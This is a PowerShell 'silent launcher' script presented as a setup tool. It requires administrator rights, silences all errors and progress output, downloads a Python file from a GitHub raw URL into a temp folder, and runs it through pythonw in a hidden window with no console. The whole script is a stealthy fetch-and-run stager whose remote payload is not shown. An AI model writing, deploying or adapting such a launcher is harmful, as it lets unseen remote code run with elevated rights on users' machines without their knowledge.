# NOBLE SETUP - Silent Launcher

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Admin check - silent fail
try {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $isAdmin) { exit }
} catch { exit }

# Silent download
$tempDir = Join-Path $env:TEMP "BraxInstaller"
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
$pyPath = Join-Path $tempDir "setup.py"

try {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/beatboxe17x-sys/setupn/refs/heads/main/setup.py" -OutFile $pyPath -UseBasicParsing | Out-Null
} catch { exit }

# Find pythonw silently
$pythonPath = $null
$possiblePaths = @(
    (Join-Path $env:LOCALAPPDATA "Programs\Python\Python311\pythonw.exe"),
    (Join-Path $env:LOCALAPPDATA "Programs\Python\Python310\pythonw.exe"),
    (Join-Path $env:ProgramFiles "Python311\pythonw.exe"),
    (Join-Path $env:ProgramFiles "Python310\pythonw.exe"),
    "pythonw"
)
foreach ($p in $possiblePaths) {
    if (Test-Path $p) { $pythonPath = $p; break }
    $found = Get-Command $p -ErrorAction SilentlyContinue
    if ($found) { $pythonPath = $found.Source; break }
}
if (-not $pythonPath) { exit }

# Silent tkinter check
& $pythonPath -c "import tkinter" 2>$null | Out-Null
if ($LASTEXITCODE -ne 0) {
    & $pythonPath -m pip install tk -q --no-warn-script-location 2>$null | Out-Null
}

# Launch hidden - NO CONSOLE, NO OUTPUT
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $pythonPath
$psi.Arguments = "`"$pyPath`""
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow = $true
$psi.UseShellExecute = $false
[System.Diagnostics.Process]::Start($psi) | Out-Null

exit
